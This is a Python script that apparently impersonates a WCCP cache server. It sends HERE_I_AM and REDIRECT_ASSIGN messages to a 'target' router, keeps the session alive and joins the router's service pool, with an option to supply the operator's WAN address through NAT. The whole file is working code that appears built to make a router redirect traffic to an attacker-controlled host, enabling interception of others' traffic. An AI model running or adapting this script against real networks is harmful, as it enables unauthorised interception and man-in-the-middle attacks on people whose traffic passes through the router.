#!/usr/bin/env python3
import socket
import os
import threading
import select

from time import sleep
from queue import Queue, Empty
from wccplib import wccp_ra_message, wccp_isy_message, wccp_hia_message, get_my_wan_address, ip_address
from optparse import OptionParser

g_app_exiting = False
g_rq = Queue()
g_sq = Queue()
g_isyq = Queue()

def parse_portlist(portlist):
    portlist = portlist.strip().split(",")
    port_spec = []
    for port in portlist:
        num = int(port)
        port_spec.append(num)
    if len(port_spec) < 8:
        for _ in range(0, 8-len(port_spec)):
            port_spec.append(0)
    print(port_spec)
    return port_spec

def listener(sock):
    global g_app_exiting
    global g_rq
    print("[*] Starting listener...") 
    while not g_app_exiting:
        readers, _, _ = select.select([sock],[],[],1)
        for rsock in readers:
            data, addr = rsock.recvfrom(1024)
            if data:
                host, port = addr
                print("[*] Received a message from " + host)
                g_rq.put(data)
    print("[*] Got exit signal, leaving thread")

def sender(sock):
    global g_app_exiting
    global g_sq
    print("[*] Starting sender...") 
    while not g_app_exiting:
        try:
            msg, target = g_sq.get(timeout=1)
        except Empty:
            continue
        print("[*] Send %d byes to %s" % (len(msg), target.bytes2string()))
        sock.sendto(msg, (target.bytes2string(), 2048))
    print("[*] Got exit signal, leaving thread")

def keep_alive(target, server, sendq, respq, sid=None, port_spec=None):
    global g_isyq

    if not g_isyq.empty():
        last_isy = g_isyq.get()
        print("[*] Found the last ISEEYOU")
    else:
        last_isy = None
        print("[*] No ISEEYOUs :/")

    if sid is not None and port_spec is not None:
        message = wccp_hia_message(target, server, last_isy, sid=sid, port_spec=port_spec).get_message()
    else:
        message = wccp_hia_message(target, server, last_isy).get_message()
    sendq.put((message, target))
    try:
        response = respq.get(timeout=3)
        isy_msg = wccp_isy_message(response)
        g_isyq.put(isy_msg)
    except ValueError as e:
        print("[*] Malformed response from router :/, shut it down... %s" % e)
        return True
    except Empty:
        print("[*] Router took too long to respond :/, shut it down...")
        return True
    return False

def join_pool(target, server, sendq, respq, sid=None, port_spec=None):
    global g_isyq
    isy_msg = g_isyq.get()
    if sid is not None and port_spec is not None:
        message = wccp_ra_message(server, isy_msg, sid=sid, port_spec=port_spec).get_message()
    else:
        message = wccp_ra_message(server, isy_msg).get_message()
    sendq.put((message, target))
    g_isyq.put(isy_msg)
    return False
    
def main():
    global g_app_exiting
    global g_rq
    global g_sq

    config = {}
    parser = OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Target IP: x.x.x.x")
    parser.add_option("-s", "--server", dest="serveraddr", help="WCCP Server IP (disables NAT punch-through)")
    parser.add_option("-i", "--service-id", dest="sid", help="Dynamic Service ID (optional)")
    parser.add_option("-p", "--port-list", dest="portlist", help="Dynamic Service port spec (required for -i)")


    (options, args) = parser.parse_args()

    if not options.target:
        print("Supply a target with -t")
        exit(-1)

    if not options.serveraddr:
        wan_ip = get_my_wan_address()
        print("[*] External WAN address %s" % wan_ip)
    else:
        wan_ip = options.serveraddr
        print("[*] Using manual server address %s" % wan_ip)

    if not options.sid:
        sid = 0
    else:
        sid = int(options.sid)
        if sid !=0 and sid > 255:
            print("[-] Dynamic service ids must be 0-255")
            exit(-1)

    if options.portlist and sid == 0:
        print("[-] Portlist must be used with sid > 0")
        exit(-1)

    if not options.portlist and sid > 0:
        print("[-] Portlist required for dynamic service ports")
        exit(-1)

    port_spec = parse_portlist(options.portlist)

    config["target"] = ip_address(options.target)
    config["server"] = wan_ip
    config["sid"] = sid
    config["port_spec"] = port_spec

    sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('',2048))

    threads = []
    threads.append(threading.Thread(target=listener, args={sock,}))
    threads.append(threading.Thread(target=sender, args={sock,}))
    for t in threads:
        t.setDaemon(True)
        t.start()

    g_app_exiting = keep_alive(config["target"],config["server"],g_sq,g_rq,sid=config["sid"], port_spec=config["port_spec"])
    if not g_app_exiting:
        sleep(4)
        g_app_exiting = keep_alive(config["target"],config["server"],g_sq,g_rq,sid=config["sid"], port_spec=config["port_spec"])

    if not g_app_exiting:
        print("[*] Got positive response from router, lets try to join the pool...")
        sleep(6)
        g_app_exiting = join_pool(config["target"],config["server"],g_sq,g_rq,sid=config["sid"], port_spec=config["port_spec"])

    while not g_app_exiting:
        g_app_exiting = keep_alive(config["target"],config["server"],g_sq,g_rq,sid=config["sid"], port_spec=config["port_spec"])
        sleep(4)
    
    for t in threads:
        t.join()
    sock.close()

if __name__=="__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit(0)
